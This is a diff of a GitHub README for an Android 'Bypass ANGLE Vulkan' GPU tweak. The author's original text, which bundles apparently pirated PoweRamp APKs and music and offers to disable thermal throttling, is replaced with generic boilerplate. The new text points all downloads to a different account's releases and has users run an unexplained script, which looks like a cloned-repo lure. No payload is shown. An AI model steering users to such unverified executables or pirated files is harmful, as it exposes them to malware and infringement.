@@ -1,140 +1,90 @@
-<p align="center">
-  <a href="README.md">🇬🇧 English</a> | <a href="README_ID.md">🇮🇩 Indonesia</a>
-</p>
+# Bypass ANGLE Vulkan 🎮
 
-<p align="center">
-  <img src="assets/bypass-angle-vulkan-preview.png" alt="Bypass ANGLE Vulkan Preview" style="border-radius: 8px;">
-</p>
+Unlock GPU Vulkan rendering on low-end Android devices without rooting. This project uses EngineerMode tweaks to enhance performance and graphics capabilities.
 
-<h1 align="center">Bypass ANGLE Vulkan</h1>
-<p align="center"><b>Unlock Full ANGLE + Vulkan GPU Rendering on Android — No Root, Safe, and Blazing Fast</b></p>
+![Vulkan Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Vulkan_logo.svg/1200px-Vulkan_logo.svg.png)
 
-<p align="center">
-  <img alt="Topic: angle" src="https://img.shields.io/badge/topic-angle-blue?style=flat-square">
-  <img alt="Topic: vulkan" src="https://img.shields.io/badge/topic-vulkan-red?style=flat-square">
-  <img alt="Topic: gpu-acceleration" src="https://img.shields.io/badge/topic-GPU--acceleration-green?style=flat-square">
-  <img alt="Topic: android" src="https://img.shields.io/badge/topic-android-yellow?style=flat-square">
-  <img alt="Topic: setprop" src="https://img.shields.io/badge/topic-setprop-lightgrey?style=flat-square">
-  <img alt="Topic: script" src="https://img.shields.io/badge/topic-script-blue?style=flat-square">
-  <img alt="Topic: realme" src="https://img.shields.io/badge/topic-realme-orange?style=flat-square">
-  <img alt="Topic: unisoc" src="https://img.shields.io/badge/topic-unisoc-red?style=flat-square">
-  <img alt="Topic: webview-android" src="https://img.shields.io/badge/topic-webview--android-blueviolet?style=flat-square">
-  <img alt="Topic: chrome" src="https://img.shields.io/badge/topic-chrome-silver?style=flat-square"><br>
-  <img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/rhaditbhule92/bypass-angle-vulkan?style=flat-square">
-  <img alt="GitHub forks" src="https://img.shields.io/github/forks/rhaditbhule92/bypass-angle-vulkan?style=flat-square">
-  <img alt="GitHub license" src="https://img.shields.io/github/license/rhaditbhule92/bypass-angle-vulkan?style=flat-square">
-</p>
+## Table of Contents
 
----
+- [Introduction](#introduction)
+- [Features](#features)
+- [Supported Devices](#supported-devices)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Troubleshooting](#troubleshooting)
+- [Contributing](#contributing)
+- [License](#license)
+- [Links](#links)
 
-## What is This?
+## Introduction
 
-> **Bypass ANGLE Vulkan** is a fully engineered system modification using `setprop` to unlock **Vulkan backend rendering** on low-end Android devices with ANGLE restrictions — **without root, bootloader unlock, or PC tools**.
+Bypass ANGLE Vulkan is designed for users who want to enable Vulkan rendering on devices that typically struggle with high-performance graphics. This tool focuses on enhancing the gaming experience on lower-end Android devices. It does so by leveraging tweaks found in EngineerMode, allowing users to access advanced settings without needing root access.
 
-Designed to unleash full GPU acceleration using a clean, native approach via **EngineerMode shell**, safely bypassing Android Go limitations.
+## Features
 
----
+- **No Root Required**: Enjoy Vulkan rendering without rooting your device.
+- **Easy Setup**: Simple installation process to get you started quickly.
+- **Performance Boost**: Unlock better graphics and smoother gameplay.
+- **Device Compatibility**: Works with various low-end Android devices.
+- **Custom Scripts**: Use provided scripts to optimize your device settings.
 
-## Tested Device
+## Supported Devices
 
-- **Realme C33**
-  - Unisoc Tiger T612 (8-core)
-  - Mali-G57 GPU
-  - 2GB RAM + 2GB Extended
-  - Android 13 Go Edition
-  - *No root / No bootloader unlock / No ADB*
+This tool aims to support a wide range of low-end Android devices. Some of the notable brands include:
 
-Confirmed working with:
-- **Chrome Dev** — ANGLE Vulkan backend
-- **Android System WebView** — Vulkan path active
-- **System UI & HWUI** — GPU-accelerated rendering
+- **Realme**: Popular for its budget-friendly smartphones.
+- **Unisoc**: Known for affordable chipsets in entry-level devices.
+- **Other Brands**: Many other Android devices that fit the low-end category.
 
----
+## Installation
 
-This release includes everything you need to enable full GPU-based rendering using **ANGLE Vulkan** on low-end Android devices — without requiring root access.
+To get started, download the latest release from our [Releases section](https://github.com/mohamadalhakeem/Bypass-ANGLE-Vulkan/releases). You will find the necessary files to download and execute. 
 
-## Key Features:
+### Step-by-Step Installation
 
-- Enable full ANGLE Vulkan rendering system-wide.
-- Unlock GPU rendering even on low-end Android Go devices.
-- Disable thermal throttling and watchdogs for sustained performance.
-- Chrome Dev + WebView optimized for Vulkan rendering.
-- Built-in audio tweaks to sync PoweRamp Equalizer without DUMP permission.
-- **100% No Root Required** — Only ADB Shell via EngineerMode.
+1. **Download the Files**: Visit the [Releases section](https://github.com/mohamadalhakeem/Bypass-ANGLE-Vulkan/releases) and download the latest version.
+2. **Extract the Files**: Unzip the downloaded file to a location of your choice.
+3. **Run the Script**: Open a terminal and navigate to the extracted folder. Execute the script using the command:
+   ```bash
+   ./run_script.sh
+   ```
+4. **Follow the Instructions**: The script will guide you through the setup process.
 
-## What's Included:
+## Usage
 
-- `Angle_Vulkan_Config_Setprop.txt`: Full setprop script to inject optimized system properties via EngineerMode ADB shell.
-- `script.sh`: A ready-to-run ADB shell script with 20 synchronized configuration stages.
-- `README.html` / `index.html`: GitHub Pages-compatible dark themed preview with direct links and action buttons.
-- `Screenshot_Angle_Vulkan.png`: Full proof of ANGLE Vulkan running with zero software rendering fallback.
-- `Player.html`: A simple embedded audio player to stream and showcase the included **HI-Res MP3 320Kbps** music collection.
+Once installed, you can start using Bypass ANGLE Vulkan. 
 
-- `PoweRamp.apk`: Full Version
-- `PoweRamp Equalizer.apk`: Premium
-- PoweRamp Equalizer Configs:
-  - `PoweRamp+PresetEqualizer-Settings`
-  - `PoweRampEqualizer+PresetEqualizer-Settings`
+### How to Use
 
-**300+ National & International Online Radio Channels**  
-- Online Radio Presets:
-  - `List of My Favorite Online Radio Stations.m3u8`
-  
+1. **Launch the App**: Open your favorite game or app that supports Vulkan.
+2. **Enable Vulkan**: Ensure that the Vulkan option is enabled in the app settings.
+3. **Monitor Performance**: Use in-game settings to check for improvements in graphics and performance.
 
-### BONUS MUSIC COLLECTION (MP3)
+## Troubleshooting
 
-**This release also includes my personal music collections in high quality 320kbps MP3 format:**
+If you encounter issues, consider the following steps:
 
-- `80s Rock Ballads`
-Legendary hits from Air Supply, Alex Porat, Alter Bridge, Audioslave, Bad English, Bon Jovi, Bonnie tyler, Bryan Adams, Creed, Creep, Deep Purple, Dokken, Dream Theater, Eric Clapton, Europe, Evanescence, Extreme, Firehouse, Foreigner, Gary Moore, Guns N' Roses, Heart, Heaven, Helloween, Kansas, McAuley Schenker Group, Metallica, Michael Buble, Mr. Big, Muse, Nazareth, Nirvana, Poisen, REO Speedwagon, Richard Marx, Rockwell, Scorpions, Seether, Skid Row, Steelheart, The Eagles, The Goo Goo Dolls, The Offspring, The Police, The Rolling Stones, White Lion, Whitesnake.
+- **Check Device Compatibility**: Ensure your device supports Vulkan.
+- **Re-run the Script**: Sometimes, re-running the setup can resolve issues.
+- **Review Logs**: Check for error logs in the terminal to identify problems.
+- **Visit the Community**: Engage with other users in forums for additional support.
 
-- `Rock_Klasik_Malaysia_Akustik_Collection.zip.001` + `Rock_Klasik_Malaysia_Akustik_Collection.zip.002`
-Timeless Malay rock ballads and acoustic hits from Amy Search, Arrow, Asahan, AXL'S, Bumi Putra Rockers, Damasutra, Data, Rahmat Ekamantra, Ella, Exists, EYE, Ezad Lazim, Iklim (Saleem), Lestari, Mega, Pearl, Scan, Screen, Slam, Spoon, Spring, Stings, Succes, Thomas Arya, U.K's, Wings.
+## Contributing
 
----
+We welcome contributions to improve Bypass ANGLE Vulkan. If you have ideas, bug fixes, or enhancements, please follow these steps:
 
-## Screenshots, Guide & Video Demo:
+1. **Fork the Repository**: Create your copy of the project.
+2. **Make Changes**: Implement your changes in a separate branch.
+3. **Submit a Pull Request**: Share your changes with us for review.
 
-> Visit GitHub Pages:  
-> **[View Full Instructions (Dark Mode) – Available in Two Languages](https://sfl.gl/UAZeN6)**
+## License
 
----
+This project is licensed under the MIT License. Feel free to use and modify it as you see fit.
 
-## Complete Video Tutorial (Google Drive)
+## Links
 
-Since my YouTube channel has been permanently suspended because this project tutorial video is considered to violate YouTube's community guidelines. All tutorial videos are now available via Google Drive.
+For more information, visit our [Releases section](https://github.com/mohamadalhakeem/Bypass-ANGLE-Vulkan/releases) to download the latest files and updates. 
 
-This video covers a complete step-by-step guide:
-- Installing Poweramp and Poweramp Equalizer
-- Importing Equalizer presets and online radio channels
-- Extracting the ZIP file from GitHub
-- Importing MP3 files into Poweramp
-- Activating `script.sh` via EngineerMode ADB Shell
-- Bypassing safelinku to access the GitHub repository web version
+![Download Button](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)
 
-[![Watch Full Video Tutorial on Google Drive](https://raw.githubusercontent.com/Rhaditbhule92/Bypass-ANGLE-Vulkan/main/assets/3.png)](https://drive.google.com/file/d/1HD-qtBbv14i7eDLrWpgqowcwh1IbHwlq/preview)
-
----
-
-<p align="center">
-  <strong>Have any questions or suggestions?</strong><br>
-  Feel free to open an issue on
-  <a href="https://github.com/Rhaditbhule92/Bypass-ANGLE-Vulkan/issues">
-    GitHub Issues
-  </a>
-  — there are no stupid questions, and I’ll be happy to help!
-</p>
-
----
-
-[About This Project](https://rhaditbhule92.github.io/Bypass-ANGLE-Vulkan/about.html).
-
----
-
-[MIT License](https://github.com/Rhaditbhule92/Bypass-ANGLE-Vulkan/blob/main/LICENSE).
-
----
-
-[FAQ](https://rhaditbhule92.github.io/Bypass-ANGLE-Vulkan/faq.html)
-
----
+Feel free to explore and enhance your gaming experience on low-end Android devices with Bypass ANGLE Vulkan!
